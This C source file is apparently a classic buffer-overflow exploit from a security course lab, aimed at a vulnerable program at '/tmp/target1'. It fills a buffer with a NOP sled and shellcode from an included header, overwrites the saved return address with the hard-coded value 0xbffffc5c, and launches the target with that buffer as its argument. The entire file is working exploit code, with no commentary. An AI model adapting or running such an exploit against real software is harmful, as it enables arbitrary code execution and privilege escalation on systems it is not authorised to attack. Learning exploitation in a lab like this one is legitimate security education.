#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char sploits[256+4+4+1];
  memset(sploits, 0x90, sizeof(sploits));
  sploits[sizeof(sploits) - 1] = '\0';
  memcpy(sploits, shellcode, sizeof(shellcode)-1);
  
  int* ret = (int*)(sploits + 256 + 4);
  *ret = 0xbffffc5c;

  char *args[] = { TARGET, sploits, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
